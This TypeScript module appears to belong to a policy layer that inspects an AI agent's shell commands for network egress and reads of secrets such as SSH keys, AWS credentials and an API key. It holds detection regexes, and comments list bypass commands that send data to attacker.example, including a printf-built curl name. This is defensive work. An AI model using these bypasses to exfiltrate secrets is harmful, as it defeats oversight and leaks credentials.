/**
 * Capability extraction: structured invocations -> the capabilities an action
 * would exercise.
 *
 * Policy is expressed over capabilities, not syntax. `curl`, `python -c`, a
 * `/dev/tcp` redirect and an obfuscated binary next to a URL are four spellings
 * of one capability — NETWORK_EGRESS to some resource — and the rules should
 * say so once rather than enumerate the spellings. Keeping this seam explicit
 * is also what lets the same rules govern non-shell actions later: an MCP tool
 * call or a database write reaches the policy as a CapabilityRequest too.
 *
 * The honest boundary: capabilities here are *inferred from command text*, so
 * this is a stronger abstraction over the same evidence, not a stronger
 * guarantee than parsing can give. What text cannot reveal (a destination built
 * at runtime, a fully encoded command) is still invisible.
 */

import {
  executableSegments,
  hostFromToken,
  hostsFromNetworkInvocation,
  invocationFromSegment,
  networkToolInvocations,
  networkToolSegments,
  shellWords,
  SHELL_NAMES,
  unwrapShell,
} from "./shell-parse.js";

/** What an action would do, independent of the syntax that requested it. */
export type Capability = "NETWORK_EGRESS" | "SECRET_READ";

/** How the capability was established, kept for evidence and for rule tuning. */
export type CapabilityEvidence =
  | "network-tool"      // a recognised binary in command position
  | "interpreter"       // a language runtime's networking API
  | "destination-only"  // a destination with no recognised tool: hidden binary
  | "protected-material"; // a path or dereference naming protected material

/**
 * One capability an action requests, against one resource.
 *
 * `resource` is a hostname for NETWORK_EGRESS and the label of the protected
 * material for SECRET_READ. `trusted` is resolved against the run's allowlist,
 * so the rules never re-derive it.
 */
export interface CapabilityRequest {
  capability: Capability;
  resource: string;
  trusted: boolean;
  via: CapabilityEvidence;
}

export interface PolicyContext {
  allowedHosts: string[];
  /**
   * Literal secret values to mask in recorded evidence. The platform knows its
   * own Ark key, so if an Agent ever inlines it the audit trail must not repeat
   * it back into storage, the API, or the browser.
   */
  secretValues?: string[];
}

// Tools that reach the network only for particular subcommands. Treating all of
// `git` or `npm` as egress would deny `git commit -m "see https://..."`, which
// contacts nothing; matching the subcommand keeps `git push` and
// `npm install --registry` covered without that false positive.

const CONDITIONAL_NETWORK = [
  /(^|[\s;&|("'`])git\s+(?:-\S+\s+)*(push|pull|fetch|clone|remote|submodule|ls-remote)\b/i,
  /(^|[\s;&|("'`])(?:npm|pnpm|yarn|npx)\s+(?:-\S+\s+)*(install|ci|add|publish|update|audit|pack|dlx|exec)\b/i,
  /(^|[\s;&|("'`])pip3?\s+(?:-\S+\s+)*(install|download|wheel)\b/i,
  /(^|[\s;&|("'`])go\s+(get|mod|install)\b/i,
  /(^|[\s;&|("'`])(?:apt|apt-get|brew|gem|cargo|poetry)\s+(?:-\S+\s+)*(install|add|update|upgrade|fetch)\b/i,
];


// Commands that merely write a URL as text: a commit message, an echo into a
// file. These contact nothing and must stay allowed.
//
// Anchored to the *leading* command on purpose. Matching anywhere let
// `$(printf '\x63\x75\x72\x6c') https://attacker.example` exempt itself, where
// printf builds the binary name rather than printing text.

export const TEXTUAL_URL_CONTEXT =
  /^\s*(?:\S*sh\s+-\S+\s+)?["']?\s*(echo|printf|git\s+(?:commit|tag))\b/i;
// `echo 'curl http://x' > run.sh && bash run.sh` writes a command as text and
// then runs it, so the textual carve-out must not apply. The script that runs
// has to be the file that was written: matching any redirect followed by any
// shell denied ordinary work such as writing a URL into notes.md and then
// running an unrelated build script.

export function runsWrittenScript(command: string): boolean {
  const written = new Set<string>();
  for (const match of command.matchAll(/>>?\s*([^\s;&|<>]+)/g)) {
    written.add(scriptIdentity(match[1]!));
  }
  if (written.size === 0) return false;

  for (const segment of executableSegments(command)) {
    const invocation = invocationFromSegment(segment, true);
    if (!invocation) continue;
    const { tool, args } = invocation;
    // Executing the file directly, e.g. `./run.sh`.
    if (written.has(scriptIdentity(tool))) return true;
    if (!SHELL_NAMES.has(tool) && tool !== "source" && tool !== ".") continue;
    for (const argument of args) {
      if (argument.startsWith("-")) continue;
      if (written.has(scriptIdentity(argument))) return true;
    }
  }
  return false;
}

function scriptIdentity(token: string): string {
  const unquoted = token.replace(/^['"]+/, "").replace(/['"]+$/, "");
  return (unquoted.split("/").pop() ?? unquoted).toLowerCase();
}

// Any absolute URL, whatever binary (if any) is next to it.

export const ANY_URL = /\b[a-z][a-z0-9+.-]*:\/\/[^\s"'`)]+/i;

export function usesNetworkTool(command: string): boolean {
  if (networkToolSegments(command).length > 0) return true;
  return CONDITIONAL_NETWORK.some((pattern) => pattern.test(command));
}

// Interpreters can reach the network without naming a network tool.

export const INLINE_NETWORK =
  /(python3?\s+-c\b[\s\S]*\b(socket|urllib|requests|httpx|http\.client|getaddrinfo)\b)|(node\s+-e\b[\s\S]*\b(fetch|https?|net|dns|dgram|axios)\b)|(perl\s+-e\b[\s\S]*\b(Socket|LWP)\b)|(\/dev\/(tcp|udp)\/)|(ruby\s+-e\b[\s\S]*\b(Net::HTTP|open-uri|Socket)\b)|(deno\s+(eval|run)\b)|(php\s+-r\b[\s\S]*\b(file_get_contents|curl_|fsockopen)\b)/i;

const PROTECTED_SECRETS = [
  { pattern: /\.secrets?\b|\.sec\*/, label: "protected .secrets/ directory" },
  { pattern: /customer-db-url/, label: "protected credential fixture" },
  { pattern: /\/proc\/(?:[^/\s]+\/)*environ\b/, label: "process environment dump" },
  { pattern: /\bid_rsa\b|\.ssh\/id_/, label: "SSH private key" },
  { pattern: /\.aws\/credentials/, label: "AWS credentials file" },
];

// Network tools whose destination arguments can be inspected in command
// position. This set drives argument-aware host extraction.

function hasShellArkDereference(command: string): boolean {
  let quote: "'" | '"' | null = null;
  let escaped = false;
  for (let index = 0; index < command.length; index += 1) {
    const char = command[index]!;
    if (escaped) {
      escaped = false;
      continue;
    }
    if (char === "\\" && quote !== "'") {
      escaped = true;
      continue;
    }
    if (char === "'" || char === '"') {
      if (quote === char) quote = null;
      else if (!quote) quote = char;
      continue;
    }
    if (char !== "$" || quote === "'") continue;
    const rest = command.slice(index);
    if (/^\$ARK_API_KEY\b/.test(rest) || /^\$\{!?ARK_API_KEY(?::?[-+?=][^}]*)?\}/.test(rest)) {
      return true;
    }
  }
  return false;
}

const RUNTIME_TOOLS = new Set(["node", "deno", "python", "python3", "perl", "ruby", "php"]);

const RUNTIME_ARK_ACCESS =
  /(?:process\.env|Deno\.env)(?:\[['"]ARK_API_KEY['"]\]|\.ARK_API_KEY)|os\.(?:environ(?:\[['"]ARK_API_KEY['"]\]|\.get\(['"]ARK_API_KEY['"]\))|getenv\(['"]ARK_API_KEY['"]\))|ENV\[['"]ARK_API_KEY['"]\]|getenv\(['"]ARK_API_KEY['"]\)/i;

// Spellings of the protected variable that a filter argument may carry. An
// exact-match check let the same request through as `grep ARK_API`, while the
// corpus treats `grep ARK` and `grep ARK_API_KEY` as attacks.

const ARK_FILTER_TOKEN = /^\^?ARK(?:_?API(?:_?KEY)?)?\$?$/i;

function hasNamedArkAccess(command: string): boolean {
  const inner = unwrapShell(command);
  if (hasShellArkDereference(inner)) return true;
  const segments = executableSegments(command);
  if (segments.some((segment) => hasShellArkDereference(segment))) return true;
  let fullEnvironmentSeen = false;
  for (const segment of segments) {
    const rawInvocation = invocationFromSegment(segment, false);
    const invocation = invocationFromSegment(segment, true);
    if (
      (rawInvocation?.tool === "printenv" && rawInvocation.args.length === 0) ||
      (rawInvocation?.tool === "env" && rawInvocation.args.length === 0)
    ) {
      fullEnvironmentSeen = true;
    }
    if (!invocation) continue;
    if (
      invocation.tool === "printenv" &&
      invocation.args.some((argument) => argument === "ARK_API_KEY")
    ) {
      return true;
    }
    if (RUNTIME_TOOLS.has(invocation.tool) && RUNTIME_ARK_ACCESS.test(segment)) {
      return true;
    }
    if (
      fullEnvironmentSeen &&
      shellWords(segment).some((argument) => ARK_FILTER_TOKEN.test(argument))
    ) {
      return true;
    }
  }
  return false;
}

export function findProtectedSecret(command: string): string | null {
  if (hasNamedArkAccess(command)) return "Ark API key";
  for (const secret of PROTECTED_SECRETS) {
    if (secret.pattern.test(command)) return secret.label;
  }
  return null;
}

// Invocations whose resolved leading binary is a recognised network tool.

function inlineNetworkHosts(command: string): string[] {
  const hosts: string[] = [];
  const patterns = [
    /(?:connect|getaddrinfo|create_connection)\s*\(\s*\(?\s*['"]([^'"]+)['"]/gi,
    /(?:resolve|resolve4|resolve6|lookup)\s*\(\s*['"]([^'"]+)['"]/gi,
    /(?:connect|createConnection)\s*\(\s*\d+\s*,\s*['"]([^'"]+)['"]/gi,
  ];
  for (const pattern of patterns) {
    for (const match of command.matchAll(pattern)) {
      const host = hostFromToken(match[1] ?? "");
      if (host) hosts.push(host);
    }
  }
  return hosts;
}

export function extractHosts(command: string): string[] {
  const hosts = new Set<string>();

  // 1. URL authorities anywhere (any scheme), incl. IPv6 and user@host:port.
  for (const match of command.matchAll(/\b[a-z][a-z0-9+.-]*:\/\/([^\s\\"'`)]+)/gi)) {
    const host = hostFromToken("scheme://" + match[1]!);
    if (host) hosts.add(host);
  }

  // 2. Bash raw sockets: /dev/tcp/HOST/PORT.
  for (const match of command.matchAll(/\/dev\/(?:tcp|udp)\/([^/\s"'`)]+)/gi)) {
    if (match[1]) hosts.add(match[1].toLowerCase());
  }

  // 3. Destination arguments of an invoked network tool — parsed in-context,
  // with no filename/code-object filtering.
  for (const invocation of networkToolInvocations(command)) {
    for (const host of hostsFromNetworkInvocation(invocation.tool, invocation.args)) {
      hosts.add(host);
    }
  }

  // 4. Literal destinations passed to common interpreter networking APIs.
  if (INLINE_NETWORK.test(command)) {
    for (const host of inlineNetworkHosts(command)) hosts.add(host);
  }

  return [...hosts];
}
/**
 * The capabilities a command would exercise, resolved against the run's context.
 *
 * NETWORK_EGRESS is reported once per destination so a rule can speak about
 * *which* resource is untrusted. A command that names a network tool but no
 * destination still yields a NETWORK_EGRESS request with an empty resource:
 * the capability is exercised even when the destination is unreadable, and
 * pairing it with SECRET_READ is what the exfiltration rule turns on.
 */
export function extractCapabilities(
  command: string,
  context: PolicyContext,
): CapabilityRequest[] {
  const allowed = new Set(context.allowedHosts.map((host) => host.toLowerCase()));
  const requests: CapabilityRequest[] = [];

  const namedTool = usesNetworkTool(command);
  const interpreter = INLINE_NETWORK.test(command);
  const hosts = extractHosts(command);

  // A destination with no recognised tool is how an obfuscated command hides
  // its binary: the binary can be disguised, the destination cannot.
  const implicit =
    !namedTool && !interpreter && hosts.length > 0 && ANY_URL.test(command);

  if (namedTool || interpreter || implicit) {
    const via: CapabilityEvidence = namedTool
      ? "network-tool"
      : interpreter
        ? "interpreter"
        : "destination-only";
    if (hosts.length === 0) {
      requests.push({ capability: "NETWORK_EGRESS", resource: "", trusted: true, via });
    }
    for (const host of hosts) {
      requests.push({
        capability: "NETWORK_EGRESS",
        resource: host,
        trusted: allowed.has(host),
        via,
      });
    }
  }

  const secret = findProtectedSecret(command);
  if (secret) {
    requests.push({
      capability: "SECRET_READ",
      resource: secret,
      trusted: false,
      via: "protected-material",
    });
  }

  return requests;
}

/**
 * Whether a URL in this command is being written as text rather than fetched.
 *
 * `echo 'see https://x'` and `git commit -m '...https://x'` contact nothing.
 * The carve-out is withdrawn when the text written is then executed.
 *
 * SCOPED TO THE SEGMENT THAT CARRIES THE DESTINATION, not to the command.
 * `TEXTUAL_URL_CONTEXT` is anchored to the start of what it is given, so testing
 * it against a whole command line let a textual leading command exempt
 * everything after it. Every one of these was ALLOWED:
 *
 *     echo start && python3 fetch.py https://attacker.example/x
 *     echo hi     ; ./mytool --endpoint https://attacker.example/x
 *     echo hi $(python3 fetch.py https://attacker.example/x)
 *     echo hi `./upload.sh https://attacker.example/x`
 *     git commit -m "$(./up.sh https://attacker.example/x)"
 *
 * The exposure was any binary outside the recognised-tool lists - including an
 * ordinary in-workspace script - behind a separator OR inside a command
 * substitution. `executableSegments` already sees through both, including
 * `sh -c` bodies and nesting, so the carve-out is asked about the segment that
 * actually names a destination rather than about the line.
 *
 * A segment "carries a destination" if it mentions any host at all, allowlisted
 * or not. Filtering to untrusted hosts here would be wrong twice over: the
 * allowlist decision belongs to `untrustedDestinations`, and withdrawing the
 * carve-out cannot itself cause a denial - the rules still require an untrusted
 * destination to fire.
 */
export function isTextualUrlOnly(command: string): boolean {
  if (!TEXTUAL_URL_CONTEXT.test(command)) return false;
  if (runsWrittenScript(command)) return false;

  const carrying = executableSegments(command).filter(
    (segment) => extractHosts(segment).length > 0 || ANY_URL.test(segment),
  );
  // No segment names a destination: fall back to judging the whole command,
  // which is what the anchored test already did. Stricter, never laxer.
  if (carrying.length === 0) return TEXTUAL_URL_CONTEXT.test(command);
  return carrying.every((segment) => TEXTUAL_URL_CONTEXT.test(segment));
}

/** Destinations in a capability set that the run is not permitted to reach. */
export function untrustedDestinations(requests: CapabilityRequest[]): string[] {
  return [
    ...new Set(
      requests
        .filter((r) => r.capability === "NETWORK_EGRESS" && !r.trusted && r.resource)
        .map((r) => r.resource),
    ),
  ];
}
